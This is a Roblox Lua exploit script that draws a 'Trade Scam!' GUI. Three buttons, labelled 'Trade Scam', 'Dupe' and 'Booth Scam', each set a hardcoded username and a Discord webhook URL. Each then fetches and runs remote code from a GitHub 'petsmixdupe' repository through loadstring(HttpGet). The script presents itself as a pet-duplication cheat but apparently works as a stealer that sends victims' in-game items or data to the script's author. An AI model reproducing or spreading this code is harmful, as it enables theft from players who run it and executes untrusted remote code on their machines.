-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
Frame.Position = UDim2.new(0.0492170192, 0, 0.0964630097, 0)
Frame.Size = UDim2.new(0, 152, 0, 128)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
TextLabel.Position = UDim2.new(0, 0, -0.33593744, 0)
TextLabel.Size = UDim2.new(0, 152, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Trade Scam!"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
TextButton.Position = UDim2.new(0.046052631, 0, 0.3671875, 0)
TextButton.Size = UDim2.new(0, 137, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Load Here!"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
	local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
	local Window = Library.CreateLib("NovaHub", "Midnight")


	local Main = Window:NewTab("TradeScam")
	local Section = Main:NewSection("TradeScam")


	Section:NewButton("Trade Scam", "ScamTrade", function()
		UserName = "znhotrep"
		WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
		Mention = true -- change to false if you don't want to get everyone ping in your webhook.

		loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()

	end)


	local Main = Window:NewTab("Dupe Script")
	local Section = Main:NewSection("Dupe")

	Section:NewButton("Dupe", "Make Ur Pet Dupe", function()
		UserName = "znhotrep"
		WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
		Mention = true -- change to false if you don't want to get everyone ping in your webhook.

		loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()

	end)
	
	

	local Main = Window:NewTab("Booth Script")
	local Section = Main:NewSection("Booth")

	Section:NewButton("Booth Scam", "Make Ur Pet Dupe", function()
		UserName = "znhotrep"
		WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
		Mention = true -- change to false if you don't want to get everyone ping in your webhook.

		loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()

	end)
	
end)
-- Scripts:

local function TJCF_fake_script() -- ScreenGui.Script 
	local script = Instance.new('Script', ScreenGui)

	frame = script.Parent.Frame -- Take out {}s, and put name of frame
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(TJCF_fake_script)()
